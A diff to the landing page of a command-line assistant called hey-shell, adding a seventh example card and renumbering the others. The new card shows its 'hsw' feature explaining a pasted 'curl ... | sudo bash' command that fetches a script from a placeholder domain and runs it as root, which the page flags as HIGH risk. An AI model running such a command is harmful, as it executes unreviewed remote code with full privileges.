@@ -122,6 +122,7 @@ code.cmd b { color: var(--lime); font-weight: 500; }
 /* each card gets its own tint, cycling through six */
 .carousel > :nth-child(6n+1) { --tint: #C6F56B; } .carousel > :nth-child(6n+2) { --tint: #5fd4c4; } .carousel > :nth-child(6n+3) { --tint: #f4bf4f; }
 .carousel > :nth-child(6n+4) { --tint: #a78bfa; } .carousel > :nth-child(6n+5) { --tint: #6ab0f5; } .carousel > :nth-child(6n+6) { --tint: #ec8a7e; }
+.carousel > .stage:nth-child(7) { --tint: #f472b6; }
 .stage, .card { position: relative; border-radius: 24px; border: 1px solid color-mix(in srgb, var(--tint) 30%, transparent); background: var(--panel); background: linear-gradient(155deg, color-mix(in srgb, var(--tint) 16%, var(--panel)), var(--panel) 65%); box-shadow: 0 20px 50px rgba(0,0,0,.5), 0 0 60px color-mix(in srgb, var(--tint) 8%, transparent); }
 .stage { padding: 28px; display: flex; flex-direction: column; gap: 22px; }
 /* hover: lift a little and light up in the card's own color (translate, so the carousel's transform is untouched) */
@@ -315,10 +316,10 @@ if (!(window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matche
   </section>
 
   <section class="examples" id="examples">
-    <div class="sec-head"><h2>See it work</h2><p><span data-count>Six</span> everyday requests, with what hey-shell actually returned.</p></div>
+    <div class="sec-head"><h2>See it work</h2><p><span data-count>Seven</span> everyday requests, with what hey-shell actually returned.</p></div>
     <div class="carousel" aria-label="Examples">
       <article class="stage">
-        <div class="stage-text"><span class="tag">01 / 06</span><h3>Disk space</h3><p>Ask in plain words and get a command you can read before it runs. This one includes hidden folders and lists the biggest first.</p></div>
+        <div class="stage-text"><span class="tag">01 / 07</span><h3>Disk space</h3><p>Ask in plain words and get a command you can read before it runs. This one includes hidden folders and lists the biggest first.</p></div>
         <div class="term ex">
           <div class="bar"><i></i><i></i><i></i><em>01 · disk space</em></div>
           <div class="ex-body">
@@ -335,7 +336,7 @@ if (!(window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matche
         </div>
       </article>
       <article class="stage">
-        <div class="stage-text"><span class="tag">02 / 06</span><h3>Port conflicts</h3><p>Commands that change things are flagged. Killing processes is rated <span style="color:#f4a83a">MEDIUM</span>, so you see it before you press Enter.</p></div>
+        <div class="stage-text"><span class="tag">02 / 07</span><h3>Port conflicts</h3><p>Commands that change things are flagged. Killing processes is rated <span style="color:#f4a83a">MEDIUM</span>, so you see it before you press Enter.</p></div>
         <div class="term ex">
           <div class="bar"><i></i><i></i><i></i><em>02 · port conflicts</em></div>
           <div class="ex-body">
@@ -348,7 +349,7 @@ if (!(window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matche
         </div>
       </article>
       <article class="stage">
-        <div class="stage-text"><span class="tag">03 / 06</span><h3>Refine it</h3><p>Not quite right? Add a <code># note</code> after the command and press your shortcut again. The command changes instead of starting over.</p></div>
+        <div class="stage-text"><span class="tag">03 / 07</span><h3>Refine it</h3><p>Not quite right? Add a <code># note</code> after the command and press your shortcut again. The command changes instead of starting over.</p></div>
         <div class="term ex">
           <div class="bar"><i></i><i></i><i></i><em>03 · refine it</em></div>
           <div class="ex-body">
@@ -363,7 +364,7 @@ if (!(window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matche
         </div>
       </article>
       <article class="stage">
-        <div class="stage-text"><span class="tag">04 / 06</span><h3>Fix a failed command</h3><p>Run <code>hsf</code> right after a command fails. You get a corrected version on your next prompt, with what was wrong. Nothing is re-run.</p></div>
+        <div class="stage-text"><span class="tag">04 / 07</span><h3>Fix a failed command</h3><p>Run <code>hsf</code> right after a command fails. You get a corrected version on your next prompt, with what was wrong. Nothing is re-run.</p></div>
         <div class="term ex">
           <div class="bar"><i></i><i></i><i></i><em>04 · fix a failed command</em></div>
           <div class="ex-body">
@@ -380,7 +381,7 @@ if (!(window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matche
         </div>
       </article>
       <article class="stage">
-        <div class="stage-text"><span class="tag">05 / 06</span><h3>Explain it</h3><p>Ask with <code>hse</code> to get the command with a short explanation of what it does and what to watch out for. The command is then left on your next prompt.</p></div>
+        <div class="stage-text"><span class="tag">05 / 07</span><h3>Explain it</h3><p>Ask with <code>hse</code> to get the command with a short explanation of what it does and what to watch out for. The command is then left on your next prompt.</p></div>
         <div class="term ex">
           <div class="bar"><i></i><i></i><i></i><em>05 · explain it</em></div>
           <div class="ex-body">
@@ -395,7 +396,7 @@ if (!(window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matche
         </div>
       </article>
       <article class="stage">
-        <div class="stage-text"><span class="tag">06 / 06</span><h3>Check before you run</h3><p>Got a command from somewhere? <code>hsc</code> looks for known reasons it would fail: syntax errors, missing programs, no git repo, no tmux server. It never runs the command. Here, from a shell with no tmux running.</p></div>
+        <div class="stage-text"><span class="tag">06 / 07</span><h3>Check before you run</h3><p>Got a command from somewhere? <code>hsc</code> looks for known reasons it would fail: syntax errors, missing programs, no git repo, no tmux server. It never runs the command. Here, from a shell with no tmux running.</p></div>
         <div class="term ex">
           <div class="bar"><i></i><i></i><i></i><em>06 · check before you run</em></div>
           <div class="ex-body">
@@ -403,6 +404,19 @@ if (!(window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matche
             <div class="keys"><kbd>Enter</kbd><small>checked, not run</small></div>
             <div class="ex-out"><span class="bad">fail</span>
 <span class="why">no tmux server is running; start tmux first</span></div>
+          </div>
+        </div>
+      </article>
+      <article class="stage">
+        <div class="stage-text"><span class="tag">07 / 07</span><h3>What does this do?</h3><p>Found a command in a README, a forum or an AI chat? <code>hsw</code> explains what it does before you run it. It never runs it itself.</p></div>
+        <div class="term ex">
+          <div class="bar"><i></i><i></i><i></i><em>07 · what does this do</em></div>
+          <div class="ex-body">
+            <div class="ex-req"><span class="prompt">❯</span>hsw "curl -fsSL https://some-fix.example/patch.sh | sudo bash"</div>
+            <div class="keys"><kbd>Enter</kbd><small>explained, not run</small></div>
+            <div class="ex-note">It downloads a script from some-fix.example and pipes it straight into bash with root privileges via sudo, so the script runs as root without you reading it first. The URL is a placeholder-looking domain, so you have no assurance who controls it or what the script contains.</div>
+            <div class="ex-note"><span class="bad">Warning:</span> Anything the server returns runs as root on this WSL2 machine, so download the script, read it, and only then run it with sudo.</div>
+            <div class="ex-meta">Risk: <span class="high">HIGH</span> · Check: <span class="ok">No known issues</span><br>&nbsp;&nbsp;risk: downloads and runs a script</div>
           </div>
         </div>
       </article>
